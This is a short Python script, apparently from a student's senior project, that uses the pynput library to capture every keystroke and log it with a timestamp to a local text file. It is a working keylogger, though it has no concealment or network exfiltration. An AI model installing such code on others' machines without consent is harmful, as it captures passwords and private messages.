from pynput.keyboard import Key, Listener      #Package that allows input from keyboard
import logging
log_dir = r"F:\SENIOR\FALL 2019\Senior Project"
logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
def on_press(key):
    logging.info(str(key))
with Listener(on_press=on_press) as listener:
    listener.join()